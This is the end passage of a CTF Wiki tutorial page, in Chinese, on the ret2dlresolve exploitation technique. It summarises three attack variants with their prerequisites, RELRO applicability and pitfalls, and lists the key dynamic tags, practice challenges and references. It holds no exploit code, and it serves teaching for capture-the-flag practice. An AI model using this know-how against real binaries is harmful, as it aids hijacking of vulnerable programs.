</code></pre></div> <h2 id=_6>总结<a class=headerlink href=#_6 title="Permanent link">&para;</a></h2> <table> <thead> <tr> <th></th> <th>修改 dynamic 节的内容</th> <th>修改重定位表项的位置</th> <th>伪造 linkmap</th> </tr> </thead> <tbody> <tr> <td>主要前提要求</td> <td>无</td> <td>无</td> <td>无信息泄漏时需要 libc</td> </tr> <tr> <td>适用情况</td> <td>NO RELRO</td> <td>NO RELRO, Partial RELRO</td> <td>NO RELRO, Partial RELRO</td> </tr> <tr> <td>注意点</td> <td></td> <td>确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td> <td>确保重定位位置可写；需要着重伪造重定位表项、符号表；</td> </tr> </tbody> </table> <p>总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为</p> <ul> <li>DT_JMPREL</li> <li>DT_SYMTAB</li> <li>DT_STRTAB</li> <li>DT_VERSYM</li> </ul> <h2 id=_7>题目<a class=headerlink href=#_7 title="Permanent link">&para;</a></h2> <ul> <li>pwnable.kr unexploitable</li> <li>pwnable.tw unexploitable</li> <li>0CTF 2018 babystack</li> <li>0CTF 2018 blackhole</li> </ul> <h2 id=_8>参考<a class=headerlink href=#_8 title="Permanent link">&para;</a></h2> <ol> <li><a href=http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ >http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> ，深入浅出。</li> <li><a href=https://www.math1as.com/index.php/archives/341/ >https://www.math1as.com/index.php/archives/341/</a></li> <li><a href=https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ >https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li> <li><a href=https://blog.csdn.net/seaaseesa/article/details/104478081>https://blog.csdn.net/seaaseesa/article/details/104478081</a></li> <li><a href=https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md>https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md</a></li> <li><a href=https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot>https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot</a></li> </ol> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../advanced-rop/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> 高级 ROP </div> </div> </a> <a href=../ret2vdso/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> ret2VDSO </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2021 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../assets/javascripts/vendor.2d9b50f1.min.js></script> <script src=../../../../../assets/javascripts/bundle.8f68a1bb.min.js></script><script id=__lang type=application/json>{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script> <script>
        app = initialize({
          base: "../../../../..",
          features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
          search: Object.assign({
            worker: "../../../../../assets/javascripts/worker/search.e77c40e2.min.js"
          }, typeof search !== "undefined" && search),
          version: {}
        })
      </script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=https://ctf-wiki.org/static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>